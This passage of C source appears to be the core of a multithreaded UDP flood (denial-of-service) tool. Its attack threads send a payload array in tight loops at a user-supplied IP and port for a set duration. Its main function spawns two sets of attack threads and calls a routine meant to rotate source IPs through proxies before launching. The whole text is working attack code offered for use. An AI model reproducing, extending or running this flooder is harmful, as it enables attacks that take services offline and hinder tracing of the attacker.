    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < PAYLOAD_COUNT; i++) {
            for (int j = 0; j < MULTIPLIER; j++) {
                if (sendto(sock, payloads2[i], strlen(payloads2[i]), 0,
                           (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                    perror("Send failed");
                    close(sock);
                    pthread_exit(NULL);
                }
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4 && argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads;

    if (argc == 5) {
        threads = atoi(argv[4]);
    } else {
        int num_cpus = get_nprocs();
        threads = num_cpus + 3;
    }

    pthread_t *thread_ids = malloc(threads * 2 * sizeof(pthread_t)); // Allocate space for double the threads
    thread_data data = {ip, port, time};

    printf("Flood started on %s:%d for %d seconds with %d threads per attack function\n", ip, port, time, threads);

    // Attempt to change IP using available proxies
    wait_for_available_proxy();

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Launched attack thread with ID: %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[threads + i], NULL, attack2, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Launched attack2 thread with ID: %lu\n", thread_ids[threads + i]);
    }

    for (int i = 0; i < threads * 2; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished\n");
    return 0;
}
